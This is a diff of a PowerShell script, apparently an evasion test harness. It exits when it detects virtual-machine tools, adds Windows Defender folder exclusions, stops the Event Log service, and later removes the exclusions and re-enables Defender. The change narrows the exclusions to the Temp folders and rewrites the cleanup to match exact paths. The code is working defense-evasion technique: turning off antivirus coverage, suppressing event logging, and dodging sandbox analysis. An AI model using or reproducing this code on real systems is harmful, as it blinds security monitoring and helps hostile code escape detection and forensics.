@@ -46,28 +46,18 @@ if (Get-Process 'vboxservice','vmtoolsd' -ErrorAction SilentlyContinue) { exit }
 
 # ========== ADD WINDOWS DEFENDER EXCLUSIONS ==========
 Write-Host "[*] Adding Windows Defender exclusions..." -ForegroundColor Cyan
-try {
-    Add-MpPreference -ExclusionPath "C:\Users\billa\Desktop" -ErrorAction Stop
-    Write-Host "[+] Desktop folder excluded." -ForegroundColor Green
-} catch { Write-Host "[-] Failed to add Desktop exclusion: $_" -ForegroundColor Yellow }
-
-try {
-    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
-    Write-Host "[+] C:\ drive excluded." -ForegroundColor Green
-} catch { Write-Host "[-] Failed to add C:\ exclusion: $_" -ForegroundColor Yellow }
-
-try {
-    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
-    Write-Host "[+] powershell.exe excluded." -ForegroundColor Green
-} catch { Write-Host "[-] Failed to add PowerShell exclusion: $_" -ForegroundColor Yellow }
 
 try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
-    Add-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
-    Write-Host "[+] Temp folders excluded." -ForegroundColor Green
-} catch { Write-Host "[-] Failed to add temp exclusions" -ForegroundColor Yellow }
+    Write-Host "[+] User Temp folder excluded: $env:TEMP" -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add user Temp exclusion: $_" -ForegroundColor Yellow }
 
-Write-Host "[*] Exclusions added. Continuing..." -ForegroundColor Cyan
+try {
+    Add-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
+    Write-Host "[+] System Temp folder excluded: $env:WINDIR\Temp" -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add system Temp exclusion: $_" -ForegroundColor Yellow }
+
+Write-Host "[*] Exclusions added (only Temp folders). Continuing..." -ForegroundColor Cyan
 
 # ========== STOP EVENT LOG SERVICE ==========
 try {
@@ -333,30 +323,53 @@ Write-Host "[*] Test finished. Press any key to exit..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 # ------------------------------------------------------------
-# REMOVE WINDOWS DEFENDER EXCLUSIONS
+# REMOVE WINDOWS DEFENDER EXCLUSIONS (safe, exact-match)
 # ------------------------------------------------------------
 Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
 
-try {
-    Remove-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
-    Write-Host "[+] C:\ exclusion removed." -ForegroundColor Green
-} catch { Write-Host "[-] Failed to remove C:\ exclusion" -ForegroundColor Yellow }
+# Define the exact exclusions we added earlier (use dynamic paths)
+$addedPaths = @(
+    "$env:USERPROFILE\Desktop",          # instead of hardcoded billa
+    "C:\",
+    "$env:TEMP",
+    "$env:WINDIR\Temp"
+)
+$addedProcesses = @("powershell.exe")
 
-try {
-    Remove-MpPreference -ExclusionPath "C:\Users\billa\Desktop" -ErrorAction Stop
-    Write-Host "[+] Desktop exclusion removed." -ForegroundColor Green
-} catch { Write-Host "[-] Desktop exclusion not found" -ForegroundColor Yellow }
+# Get current Defender preferences
+$prefs = Get-MpPreference
 
-try {
-    Remove-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
-    Write-Host "[+] PowerShell process exclusion removed." -ForegroundColor Green
-} catch { Write-Host "[-] PowerShell process exclusion not found" -ForegroundColor Yellow }
+# --- Remove folder exclusions ---
+if ($prefs.ExclusionPath) {
+    foreach ($path in $prefs.ExclusionPath) {
+        if ($addedPaths -contains $path) {
+            try {
+                Remove-MpPreference -ExclusionPath $path -ErrorAction Stop
+                Write-Host "[+] Removed exclusion: $path" -ForegroundColor Green
+            } catch {
+                Write-Host "[-] Failed to remove $path : $_" -ForegroundColor Yellow
+            }
+        }
+    }
+} else {
+    Write-Host "[!] No folder exclusions found." -ForegroundColor Gray
+}
 
-try {
-    Remove-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
-    Remove-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
-    Write-Host "[+] Temp folder exclusions removed." -ForegroundColor Green
-} catch { Write-Host "[-] Could not remove temp exclusions" -ForegroundColor Yellow }
+# --- Remove process exclusions ---
+if ($prefs.ExclusionProcess) {
+    foreach ($proc in $prefs.ExclusionProcess) {
+        if ($addedProcesses -contains $proc) {
+            try {
+                Remove-MpPreference -ExclusionProcess $proc -ErrorAction Stop
+                Write-Host "[+] Removed process exclusion: $proc" -ForegroundColor Green
+            } catch {
+                Write-Host "[-] Failed to remove process $proc : $_" -ForegroundColor Yellow
+            }
+        }
+    }
+} else {
+    Write-Host "[!] No process exclusions found." -ForegroundColor Gray
+}
 
 # ------------------------------------------------------------
 # RE-ENABLE WINDOWS DEFENDER PROTECTIONS
